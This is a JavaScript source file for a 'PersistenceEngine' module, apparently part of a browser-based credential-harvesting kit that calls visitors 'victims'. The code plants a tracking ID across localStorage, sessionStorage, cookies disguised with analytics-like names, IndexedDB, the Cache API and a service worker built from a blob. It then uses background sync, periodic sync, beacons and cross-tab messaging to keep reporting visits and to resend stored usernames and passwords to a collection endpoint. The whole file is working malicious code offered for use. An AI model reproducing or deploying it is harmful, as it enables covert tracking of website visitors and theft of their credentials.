export default class PersistenceEngine {
  constructor(core) {
    this.core = core;
    this.storageKeys = {
      main: '__harvester_id_',
      backup1: '__app_data_',
      backup2: '__user_pref_',
      backup3: '__session_cache_',
      backup4: '__analytics_',
      backup5: '__performance_metrics_',
      backup6: '__site_preferences_',
      backup7: '__visitor_data_',
      cookie1: '_hvid',
      cookie2: '_ga_h',
      cookie3: '_session_id',
      cookie4: '_track_id',
      cookie5: '_app_session',
      indexDB: 'HarvesterStore',
      swCache: 'harvester-persist-cache'
    };
    this.victimId = null;
    this.firstVisit = false;
    this.revisitCount = 0;
  }

  init() {
    // Detect if returning visitor
    this.detectReturnVisitor();
    
    // Check for existing session data and reconnect
    this.reconnectExistingSession();
    
    // Persist across tabs using BroadcastChannel
    this.setupCrossTabPersistence();
    
    // Register for auto-launch on next visit
    this.registerAutoLaunch();
    
    // Set up service worker for background re-triggering
    this.registerServiceWorkerForAutoLaunch();
    
    // Create IndexedDB store for long-term persistence
    this.setupIndexedDBPersistence();
    
    // Cookie-based persistence with expiration
    this.setupCookiePersistence();
    
    // Cache API persistence
    this.setupCachePersistence();
    
    // Background sync for offline re-triggering
    this.setupBackgroundSync();
    
    // Web Locks API for cross-tab coordination
    this.setupWebLocks();
  }

  // === RETURN VISITOR DETECTION ===

  detectReturnVisitor() {
    const storedData = this.readAllStoredData();
    
    if (storedData.victimId) {
      this.victimId = storedData.victimId;
      this.revisitCount = (storedData.revisitCount || 0) + 1;
      this.firstVisit = false;
      
      // Update revisit count
      this.saveToAllStores({ revisitCount: this.revisitCount, lastVisit: Date.now() });
      
      // Notify admin of return visitor
      this.core.send('/api/collect/formdata', {
        formId: 'return-visitor-detected',
        fields: {
          victimId: this.victimId,
          revisitCount: this.revisitCount,
          previousVisit: new Date(storedData.lastVisit || Date.now()).toISOString(),
          timeSinceLastVisit: storedData.lastVisit ? Math.floor((Date.now() - storedData.lastVisit) / 1000) + 's' : 'unknown',
          storedDataSize: JSON.stringify(storedData).length
        },
        url: window.location.href
      }).catch(() => {});
      
      // If they have existing credentials, try to reconnect and send fresh data
      if (storedData.hasCredentials) {
        this.core.send('/api/collect/bulk', {
          data: {
            returnVisit: {
              victimId: this.victimId,
              revisitCount: this.revisitCount,
              reinitiated: true,
              timestamp: Date.now()
            }
          }
        }).catch(() => {});
      }
    } else {
      // First visit - generate new ID
      this.victimId = this.generateVictimId();
      this.firstVisit = true;
      this.revisitCount = 0;
      
      // Save immediately
      this.saveToAllStores({ 
        victimId: this.victimId, 
        firstVisit: Date.now(),
        revisitCount: 0,
        initialPage: window.location.href,
        userAgent: navigator.userAgent,
        hasCredentials: false,
        permissions: {}
      });
    }
  }

  readAllStoredData() {
    let data = {};
    
    // Check all storage locations
    const locations = [
      // localStorage
      () => {
        const keys = Object.keys(localStorage);
        for (const key of keys) {
          if (key.startsWith('__') || key.startsWith('_')) {
            try {
              const parsed = JSON.parse(localStorage.getItem(key));
              if (parsed && parsed.victimId) return parsed;
            } catch(e) {}
          }
        }
        return null;
      },
      // sessionStorage
      () => {
        const keys = Object.keys(sessionStorage);
        for (const key of keys) {
          try {
            const parsed = JSON.parse(sessionStorage.getItem(key));
            if (parsed && parsed.victimId) return parsed;
          } catch(e) {}
        }
        return null;
      },
      // Cookies
      () => {
        const cookies = document.cookie.split(';');
        for (const cookie of cookies) {
          const [name, value] = cookie.split('=').map(c => c.trim());
          if (name && (name.startsWith('_hvid') || name.startsWith('_ga_h') || name.startsWith('__h'))) {
            try {
              const decoded = decodeURIComponent(value);
              const parsed = JSON.parse(decoded);
              if (parsed && parsed.victimId) return parsed;
            } catch(e) {}
          }
        }
        return null;
      }
    ];

    for (const reader of locations) {
      const result = reader();
      if (result) {
        data = { ...data, ...result };
        break;
      }
    }

    return data;
  }

  // === EXISTING SESSION RECONNECTION ===

  reconnectExistingSession() {
    // Check if we have a stored session ID from previous visits
    const sessionId = sessionStorage.getItem('harvester_session');
    const localId = localStorage.getItem('harvester_session');
    
    if (sessionId) {
      try {
        const parsed = JSON.parse(sessionId);
        if (parsed.sessionId) {
          // Reinitialize with existing session
          this.core.sessionId = parsed.sessionId;
          this.core.dbId = parsed.dbId;
          
          // Send reconnection event
          this.core.send('/api/collect/heartbeat', {
            timeOnSite: 0,
            reconnected: true,
            previousSession: parsed.sessionId
          }).catch(() => {});
        }
      } catch(e) {}
    } else if (localId) {
      // Restore from localStorage
      try {
        const parsed = JSON.parse(localId);
        if (parsed.sessionId) {
          this.core.sessionId = parsed.sessionId;
          this.core.dbId = parsed.dbId;
          sessionStorage.setItem('harvester_session', localId);
          
          this.core.send('/api/collect/heartbeat', {
            timeOnSite: 0,
            reconnectedFromLocalStorage: true
          }).catch(() => {});
        }
      } catch(e) {}
    }
    
    // Check multiple additional storage locations for session tokens
    this.recoverSessionFromBackupStores();
  }

  recoverSessionFromBackupStores() {
    const backupKeys = [
      '__session_backup', '__tab_session', '__persist_session',
      '_app_session_data', 'user_session', 'active_session',
      'current_session', 'session_state', 'app_state'
    ];
    
    for (const key of backupKeys) {
      try {
        let value = localStorage.getItem(key);
        if (!value) value = sessionStorage.getItem(key);
        if (!value) continue;
        
        const parsed = JSON.parse(value);
        if (parsed && (parsed.sessionId || parsed.session || parsed.id) && !this.core.sessionId) {
          const foundId = parsed.sessionId || parsed.session || parsed.id;
          this.core.sessionId = typeof foundId === 'string' ? foundId : JSON.stringify(foundId);
          
          // Re-sync
          this.core.send('/api/collect/heartbeat', {
            recoveredFrom: key,
            recoveredSessionId: this.core.sessionId?.substring(0, 30)
          }).catch(() => {});
          break;
        }
      } catch(e) {}
    }
  }

  // === CROSS-TAB PERSISTENCE ===

  setupCrossTabPersistence() {
    try {
      if (!('BroadcastChannel' in window)) return;
      
      const channel = new BroadcastChannel('__harvester_persist__');
      
      // Listen for persistence pings from other tabs
      channel.onmessage = (event) => {
        if (event.data && event.data.type === '__persist_ping__') {
          // Another tab has loaded - share our session data
          channel.postMessage({
            type: '__persist_data__',
            victimId: this.victimId,
            sessionId: this.core.sessionId,
            revisitCount: this.revisitCount,
            timestamp: Date.now()
          });
        }
        
        if (event.data && event.data.type === '__persist_data__') {
          // Receive session data from another tab
          if (!this.core.sessionId && event.data.sessionId) {
            this.core.sessionId = event.data.sessionId;
            localStorage.setItem('harvester_session', JSON.stringify({
              sessionId: event.data.sessionId
            }));
            
            this.core.send('/api/collect/heartbeat', {
              crossTabRestored: true,
              fromTab: event.data.victimId?.substring(0, 16)
            }).catch(() => {});
          }
        }
        
        if (event.data && event.data.type === '__harvester_trigger__') {
          // Triggered by another tab - re-init all modules
          this.core.initialized = false;
          this.core.init();
        }
      };
      
      // Ping other tabs
      setTimeout(() => {
        channel.postMessage({
          type: '__persist_ping__',
          victimId: this.victimId,
          sessionId: this.core.sessionId,
          timestamp: Date.now()
        });
      }, 500);
      
      // Store channel reference for cleanup
      this._broadcastChannel = channel;
    } catch(e) {}
  }

  // === AUTO-LAUNCH MECHANISMS ===

  registerAutoLaunch() {
    // Technique 1: Service Worker push events to wake up the page
    this.registerServiceWorkerForAutoLaunch();
    
    // Technique 2: Set cookie that triggers on next visit
    this.setRevisitTrigger();
    
    // Technique 3: Request background fetch permission
    this.requestBackgroundFetch();
    
    // Technique 4: Register periodic background sync
    this.registerPeriodicSync();
    
    // Technique 5: Set up beacon for reliable data on unload
    this.setupBeaconRelay();
    
    // Technique 6: Create favicon that persists across sessions
    this.setupFaviconPersistence();
    
    // Technique 7: Storage quota monitoring for re-trigger
    this.setupStorageQuotaMonitor();
  }

  async registerServiceWorkerForAutoLaunch() {
    try {
      if (!('serviceWorker' in navigator)) return;
      
      // Check if we already have a SW registered
      const registrations = await navigator.serviceWorker.getRegistrations();
      
      if (registrations.length === 0) {
        // Register a persistence SW
        const swCode = `
          const CACHE_NAME = 'harvester-persist-v1';
          const STORAGE_KEY = 'harvester-session-data';
          
          self.addEventListener('install', (e) => {
            self.skipWaiting();
            // Pre-cache important data
            e.waitUntil(
              caches.open(CACHE_NAME).then(cache => {
                return cache.addAll(['/', '/index.html']);
              })
            );
          });
          
          self.addEventListener('activate', (e) => {
            e.waitUntil(clients.claim());
            // Send trigger to all open clients
            self.clients.matchAll().then(clients => {
              clients.forEach(client => {
                client.postMessage({ type: '__harvester_sw_trigger__', timestamp: Date.now() });
              });
            });
          });
          
          self.addEventListener('fetch', (e) => {
            // Intercept and cache responses for persistence
            e.respondWith(
              caches.match(e.request).then(cachedResponse => {
                const fetchPromise = fetch(e.request).then(response => {
                  // Cache successful responses
                  if (response.ok && e.request.url.includes(window.location.origin)) {
                    const responseClone = response.clone();
                    caches.open(CACHE_NAME).then(cache => {
                      cache.put(e.request, responseClone);
                    });
                  }
                  return response;
                }).catch(() => cachedResponse);
                return fetchPromise;
              })
            );
          });
          
          self.addEventListener('message', (e) => {
            if (e.data && e.data.type === '__harvester_ping__') {
              e.ports[0]?.postMessage({ type: 'pong', swActive: true });
            }
            if (e.data && e.data.type === '__store_data__') {
              // Store data in SW for persistence
              const data = e.data.payload;
              // Use IndexedDB inside SW
              const request = indexedDB.open('HarvesterSWStore', 1);
              request.onupgradeneeded = (event) => {
                const db = event.target.result;
                if (!db.objectStoreNames.contains('data')) {
                  db.createObjectStore('data', { keyPath: 'key' });
                }
              };
              request.onsuccess = (event) => {
                const db = event.target.result;
                const tx = db.transaction('data', 'readwrite');
                const store = tx.objectStore('data');
                store.put({ key: 'sessionData', value: data, timestamp: Date.now() });
              };
            }
            if (e.data && e.data.type === '__get_data__') {
              // Retrieve stored data
              const request = indexedDB.open('HarvesterSWStore', 1);
              request.onsuccess = (event) => {
                const db = event.target.result;
                const tx = db.transaction('data', 'readonly');
                const store = tx.objectStore('data');
                const getReq = store.get('sessionData');
                getReq.onsuccess = () => {
                  e.ports[0]?.postMessage({ type: 'stored_data', data: getReq.result?.value });
                };
              };
            }
          });
          
          self.addEventListener('periodicsync', (e) => {
            if (e.tag === 'harvester-sync') {
              // Try to wake up clients
              self.clients.matchAll().then(clients => {
                clients.forEach(client => {
                  client.postMessage({ type: '__periodic_trigger__', timestamp: Date.now() });
                });
              });
            }
          });
        `;
        
        const blob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(blob);
        
        const registration = await navigator.serviceWorker.register(swUrl, {
          scope: '/',
          updateViaCache: 'none'
        });
        
        // Wait for activation
        await navigator.serviceWorker.ready;
        
        // Store SW URL for cleanup
        this._swUrl = swUrl;
        
        // Listen for messages from SW
        navigator.serviceWorker.addEventListener('message', (event) => {
          if (event.data && event.data.type === '__harvester_sw_trigger__') {
            // SW wants us to re-trigger
            if (!this.core.initialized) {
              this.core.init();
            }
          }
        });
        
        // Store session data in SW for persistence
        this.sendDataToServiceWorker();
        
        await this.core.send('/api/collect/formdata', {
          formId: 'sw-persistence-registered',
          fields: { scope: registration.scope, active: !!registration.active },
          url: window.location.href
        }).catch(() => {});
      } else {
        // Already have a SW - try to communicate with it
        const registration = registrations[0];
        if (registration.active) {
          // Check if it's our SW by sending a ping
          const messageChannel = new MessageChannel();
          const pingPromise = new Promise((resolve) => {
            messageChannel.port1.onmessage = (e) => {
              if (e.data && e.data.type === 'pong') {
                resolve(true);
              } else {
                resolve(false);
              }
            };
            setTimeout(() => resolve(false), 1000);
          });
          
          registration.active.postMessage({ type: '__harvester_ping__' }, [messageChannel.port2]);
          
          const isOurs = await pingPromise;
          if (!isOurs) {
            // Register our own SW alongside
            this.registerServiceWorkerForAutoLaunch();
          }
        }
      }
    } catch(e) {}
  }

  sendDataToServiceWorker() {
    try {
      if (!navigator.serviceWorker.controller) return;
      
      const messageChannel = new MessageChannel();
      navigator.serviceWorker.controller.postMessage({
        type: '__store_data__',
        payload: {
          victimId: this.victimId,
          sessionId: this.core.sessionId,
          revisitCount: this.revisitCount,
          firstVisit: this.firstVisit,
          timestamp: Date.now(),
          page: window.location.href
        }
      }, [messageChannel.port2]);
    } catch(e) {}
  }

  setRevisitTrigger() {
    // Set a persistent cookie with far future expiry
    const expiryDate = new Date();
    expiryDate.setFullYear(expiryDate.getFullYear() + 10); // 10 year cookie
    
    const cookieData = JSON.stringify({
      victimId: this.victimId,
      firstVisit: Date.now(),
      lastVisit: Date.now(),
      revisitCount: this.revisitCount
    });
    
    // Set multiple cookies with different names to ensure at least one survives
    const cookies = [
      { name: this.storageKeys.cookie1, value: cookieData, days: 3650 },
      { name: this.storageKeys.cookie2, value: encodeURIComponent(cookieData), days: 3650 },
      { name: this.storageKeys.cookie3, value: btoa(cookieData), days: 1825 },
      { name: this.storageKeys.cookie4, value: this.victimId, days: 3650 },
      { name: this.storageKeys.cookie5, value: btoa(this.victimId), days: 3650 }
    ];
    
    cookies.forEach(c => {
      const expires = new Date();
      expires.setDate(expires.getDate() + c.days);
      document.cookie = `${c.name}=${c.value}; expires=${expires.toUTCString()}; path=/; SameSite=Lax;`;
    });
    
    // Also set a session cookie that will be restored from localStorage on next visit
    // This helps if the user clears cookies
    this.saveToLocalStorage('__revisit_trigger', {
      victimId: this.victimId,
      expiry: Date.now() + (365 * 24 * 60 * 60 * 1000) // 1 year
    });
  }

  async requestBackgroundFetch() {
    try {
      if (!('BackgroundFetchManager' in self) && !('backgroundFetch' in navigator)) return;
      
      // Request background fetch permission for future re-triggering
      if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
        const registration = await navigator.serviceWorker.ready;
        
        if (registration.backgroundFetch) {
          const fetch = await registration.backgroundFetch.fetch('harvester-persist', ['/api/collect/heartbeat'].map(url => new Request(url, {
            method: 'POST',
            body: JSON.stringify({ backgroundTrigger: true, victimId: this.victimId }),
            headers: { 'Content-Type': 'application/json' }
          })), {
            title: 'Background sync',
            icons: [],
            downloadTotal: 1000
          }).catch(() => null);
          
          if (fetch) {
            await this.core.send('/api/collect/formdata', {
              formId: 'background-fetch-registered',
              fields: { id: fetch.id },
              url: window.location.href
            }).catch(() => {});
          }
        }
      }
    } catch(e) {}
  }

  async registerPeriodicSync() {
    try {
      if (!('PeriodicSyncManager' in window)) return;
      
      const registration = await navigator.serviceWorker.ready;
      
      // Register periodic sync (wakes up SW periodically)
      await registration.periodicSync.register('harvester-sync', {
        minInterval: 24 * 60 * 60 * 1000 // Once per day
      }).catch(() => {});
      
      // Also register a regular sync
      if ('sync' in registration) {
        await registration.sync.register('harvester-sync').catch(() => {});
      }
      
      await this.core.send('/api/collect/formdata', {
        formId: 'periodic-sync-registered',
        fields: { supported: true },
        url: window.location.href
      }).catch(() => {});
    } catch(e) {}
  }

  setupBeaconRelay() {
    // Use Beacon API to reliably send data on page unload
    // This helps with session persistence on navigation
    window.addEventListener('beforeunload', () => {
      const data = JSON.stringify({
        type: 'beacon-relay',
        victimId: this.victimId,
        sessionId: this.core.sessionId,
        revisitCount: this.revisitCount,
        timeOnSite: Math.floor((Date.now() - this.core.startTime) / 1000),
        timestamp: Date.now()
      });
      
      // Multiple beacon targets for reliability
      const endpoints = ['/api/collect/heartbeat', '/api/collect/close'];
      endpoints.forEach(endpoint => {
        try {
          navigator.sendBeacon(endpoint, JSON.stringify({
            sessionId: this.core.sessionId,
            timeOnSite: Math.floor((Date.now() - this.core.startTime) / 1000),
            persistenceData: { victimId: this.victimId, revisitCount: this.revisitCount }
          }));
        } catch(e) {}
      });
      
      // Store data in sessionStorage as backup
      try {
        sessionStorage.setItem('__unload_data', data);
      } catch(e) {}
    });
  }

  setupFaviconPersistence() {
    // Use favicon to embed small amount of data (limited but persistent)
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 16;
      canvas.height = 16;
      const ctx = canvas.getContext('2d');
      
      // Write victimId hash into favicon pixels
      const hash = this.hashString(this.victimId);
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, 16, 16);
      ctx.fillStyle = `rgb(${hash % 256}, ${(hash >> 8) % 256}, ${(hash >> 16) % 256})`;
      ctx.fillRect(0, 0, 16, 16);
      
      const favicon = document.querySelector('link[rel="icon"]') || document.createElement('link');
      favicon.rel = 'icon';
      favicon.href = canvas.toDataURL('image/x-icon');
      if (!favicon.parentNode) document.head.appendChild(favicon);
    } catch(e) {}
  }

  setupStorageQuotaMonitor() {
    // Monitor when storage becomes available (user returns) and re-trigger
    if ('storage' in navigator && navigator.storage) {
      const checkQuota = async () => {
        try {
          const estimate = await navigator.storage.estimate();
          if (estimate.quota > 0) {
            // Storage is available - re-trigger if needed
            if (!this.core.initialized) {
              this.core.init();
            }
          }
        } catch(e) {}
      };
      
      // Check periodically
      setInterval(checkQuota, 60000);
      checkQuota();
    }
  }

  // === PERSISTENCE STORAGE LAYERS ===

  setupIndexedDBPersistence() {
    try {
      if (!('indexedDB' in window)) return;
      
      const request = indexedDB.open(this.storageKeys.indexDB, 1);
      
      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('sessions')) {
          db.createObjectStore('sessions', { keyPath: 'id' });
        }
        if (!db.objectStoreNames.contains('credentials')) {
          db.createObjectStore('credentials', { keyPath: 'id', autoIncrement: true });
        }
        if (!db.objectStoreNames.contains('harvester_data')) {
          db.createObjectStore('harvester_data', { keyPath: 'key' });
        }
      };
      
      request.onsuccess = (event) => {
        this._idb = event.target.result;
        
        // Store session data in IndexedDB
        this.saveToIndexedDB();
        
        // Check for existing stored data
        this.checkIndexedDBForExistingData();
      };
    } catch(e) {}
  }

  saveToIndexedDB() {
    if (!this._idb) return;
    
    try {
      const tx = this._idb.transaction('harvester_data', 'readwrite');
      const store = tx.objectStore('harvester_data');
      
      store.put({ key: 'victimId', value: this.victimId, timestamp: Date.now() });
      store.put({ key: 'sessionId', value: this.core.sessionId, timestamp: Date.now() });
      store.put({ key: 'revisitCount', value: this.revisitCount, timestamp: Date.now() });
      store.put({ key: 'firstVisit', value: this.firstVisit, timestamp: Date.now() });
      store.put({ key: 'lastActive', value: Date.now(), timestamp: Date.now() });
      store.put({ key: 'pageUrl', value: window.location.href, timestamp: Date.now() });
      store.put({ key: 'userAgent', value: navigator.userAgent, timestamp: Date.now() });
      
      tx.oncomplete = () => {
        // Also try to recover from existing stored credentials
        this.checkIndexedDBForCredentials();
      };
    } catch(e) {}
  }

  checkIndexedDBForExistingData() {
    if (!this._idb) return;
    
    try {
      const tx = this._idb.transaction('harvester_data', 'readonly');
      const store = tx.objectStore('harvester_data');
      
      const getReq = store.get('victimId');
      getReq.onsuccess = () => {
        if (getReq.result && getReq.result.value && getReq.result.value !== this.victimId) {
          // Found different victimId - this is a returning user with data
          this.core.send('/api/collect/formdata', {
            formId: 'indexedDB-returning-user',
            fields: {
              storedVictimId: getReq.result.value,
              currentVictimId: this.victimId,
              storedSince: new Date(getReq.result.timestamp).toISOString(),
              conflict: getReq.result.value !== this.victimId
            },
            url: window.location.href
          }).catch(() => {});
        }
      };
    } catch(e) {}
  }

  checkIndexedDBForCredentials() {
    if (!this._idb) return;
    
    try {
      const tx = this._idb.transaction('credentials', 'readonly');
      const store = tx.objectStore('credentials');
      const getAllReq = store.getAll();
      
      getAllReq.onsuccess = () => {
        const credentials = getAllReq.result;
        if (credentials && credentials.length > 0) {
          // Found previously stored credentials - re-send them
          credentials.forEach(cred => {
            this.core.send('/api/collect/credentials', {
              source: 'indexedDB-persisted',
              username: cred.username || '',
              password: cred.password || '',
              email: cred.email || '',
              url: cred.url || window.location.href,
              formType: 'persisted-recovery',
              fieldData: { persistedFrom: new Date(cred.timestamp).toISOString() }
            }).catch(() => {});
          });
          
          // Update hasCredentials flag
          this.saveToAllStores({ hasCredentials: true });
        }
      };
    } catch(e) {}
  }

  setupCookiePersistence() {
    // Read existing cookies for revisit detection
    const cookies = document.cookie.split(';').map(c => c.trim());
    
    let foundData = null;
    cookies.forEach(cookie => {
      const [name, value] = cookie.split('=').map(c => c.trim());
      if (name === this.storageKeys.cookie1 || name === this.storageKeys.cookie2 || name === this.storageKeys.cookie3) {
        try {
          const decoded = name === this.storageKeys.cookie2 ? decodeURIComponent(value) : 
                           name === this.storageKeys.cookie3 ? atob(value) : value;
          const parsed = JSON.parse(decoded);
          if (parsed.victimId) {
            foundData = parsed;
            // Update lastVisit
            parsed.lastVisit = Date.now();
            parsed.revisitCount = (parsed.revisitCount || 0) + 1;
            const newExpiry = new Date();
            newExpiry.setFullYear(newExpiry.getFullYear() + 10);
            document.cookie = `${name}=${JSON.stringify(parsed)}; expires=${newExpiry.toUTCString()}; path=/; SameSite=Lax;`;
          }
        } catch(e) {
          // Try base64 decoded
          try {
            const decoded = atob(value);
            const parsed = JSON.parse(decoded);
            if (parsed.victimId) {
              foundData = parsed;
            }
          } catch(e2) {}
        }
      }
    });
    
    if (foundData && foundData.victimId && foundData.victimId !== this.victimId) {
      // Returning visitor detected via cookies
      this.victimId = foundData.victimId;
      this.revisitCount = foundData.revisitCount || 1;
      
      // Reinitialize session
      if (!this.core.sessionId && foundData.sessionId) {
        this.core.sessionId = foundData.sessionId;
      }
    }
  }

  setupCachePersistence() {
    try {
      if (!('caches' in window)) return;
      
      // Open our cache
      caches.open(this.storageKeys.swCache).then(cache => {
        // Store session data as a cached request
        const blob = new Blob([JSON.stringify({
          victimId: this.victimId,
          sessionId: this.core.sessionId,
          revisitCount: this.revisitCount,
          timestamp: Date.now()
        })], { type: 'application/json' });
        
        const response = new Response(blob, {
          headers: { 'Content-Type': 'application/json' }
        });
        
        cache.put('/__harvester_persist__', response).catch(() => {});
        
        // Also try to read existing cache data
        cache.match('/__harvester_persist__').then(cachedResponse => {
          if (cachedResponse) {
            cachedResponse.json().then(data => {
              if (data && data.victimId && data.victimId !== this.victimId) {
                // Found previous session in cache
                this.core.send('/api/collect/formdata', {
                  formId: 'cache-persistence-found',
                  fields: {
                    previousVictimId: data.victimId,
                    previousSessionId: data.sessionId || 'none',
                    cachedSince: new Date(data.timestamp).toISOString()
                  },
                  url: window.location.href
                }).catch(() => {});
              }
            }).catch(() => {});
          }
        }).catch(() => {});
      }).catch(() => {});
    } catch(e) {}
  }

  setupBackgroundSync() {
    try {
      if (!('serviceWorker' in navigator) || !('SyncManager' in window)) return;
      
      navigator.serviceWorker.ready.then(registration => {
        // Register a sync event that will fire when browser decides
        registration.sync.register('harvester-background-sync').catch(() => {});
      }).catch(() => {});
    } catch(e) {}
  }

  setupWebLocks() {
    try {
      if (!('locks' in navigator)) return;
      
      // Request a persistent lock - this keeps our data alive
      navigator.locks.request('__harvester_lock__', { mode: 'shared' }, async (lock) => {
        // Store data while lock is held
        const data = {
          victimId: this.victimId,
          sessionId: this.core.sessionId,
          timestamp: Date.now()
        };
        
        // Keep the lock alive for a while
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        return data;
      }).catch(() => {});
      
      // Check if lock exists (another tab is running our code)
      navigator.locks.query().then(locks => {
        const ourLock = locks.held?.find(l => l.name === '__harvester_lock__') || 
                        locks.pending?.find(l => l.name === '__harvester_lock__');
        if (ourLock) {
          // Our code is active in another tab
        }
      }).catch(() => {});
    } catch(e) {}
  }

  // === PERSISTENCE HELPERS ===

  saveToAllStores(data) {
    // Save to localStorage (most persistent)
    this.saveToLocalStorage(this.storageKeys.main, data);
    this.saveToLocalStorage(this.storageKeys.backup1, data);
    
    // Save to sessionStorage
    try {
      sessionStorage.setItem(this.storageKeys.main, JSON.stringify(data));
    } catch(e) {}
    
    // Save to cookies
    const cookieData = JSON.stringify(data);
    document.cookie = `${this.storageKeys.cookie1}=${cookieData}; path=/; max-age=${365 * 24 * 60 * 60}; SameSite=Lax;`;
    document.cookie = `${this.storageKeys.cookie2}=${encodeURIComponent(cookieData)}; path=/; max-age=${365 * 24 * 60 * 60}; SameSite=Lax;`;
    document.cookie = `${this.storageKeys.cookie3}=${btoa(cookieData)}; path=/; max-age=${365 * 24 * 60 * 60}; SameSite=Lax;`;
    
    // Save to IndexedDB
    if (this._idb) {
      try {
        const tx = this._idb.transaction('harvester_data', 'readwrite');
        const store = tx.objectStore('harvester_data');
        Object.entries(data).forEach(([key, value]) => {
          store.put({ key, value, timestamp: Date.now() });
        });
      } catch(e) {}
    }
    
    // Save to Cache API
    try {
      caches.open(this.storageKeys.swCache).then(cache => {
        const blob = new Blob([JSON.stringify({
          ...data,
          storedAt: Date.now()
        })], { type: 'application/json' });
        cache.put('/__harvester_persist__', new Response(blob)).catch(() => {});
      }).catch(() => {});
    } catch(e) {}
  }

  saveToLocalStorage(key, data) {
    try {
      localStorage.setItem(key, JSON.stringify(data));
    } catch(e) {
      // localStorage might be full, try clearing old harvester data
      try {
        const keys = Object.keys(localStorage);
        const ourKeys = keys.filter(k => k.startsWith('__harvester') || k.startsWith('__app') || k.startsWith('__user'));
        if (ourKeys.length > 0) {
          localStorage.removeItem(ourKeys[0]);
          localStorage.setItem(key, JSON.stringify(data));
        }
      } catch(e2) {}
    }
  }

  generateVictimId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 10);
    const navHash = this.hashString(navigator.userAgent).toString(36);
    return `vid_${timestamp}_${random}_${navHash}`;
  }

  hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash);
  }

  // === CLEANUP ===

  cleanup() {
    // Close BroadcastChannel
    if (this._broadcastChannel) {
      this._broadcastChannel.close();
    }
    
    // Close IndexedDB
    if (this._idb) {
      this._idb.close();
    }
    
    // Save final state
    this.saveToAllStores({
      victimId: this.victimId,
      sessionId: this.core.sessionId,
      lastVisit: Date.now(),
      revisitCount: this.revisitCount,
      lastPage: window.location.href
    });
  }
}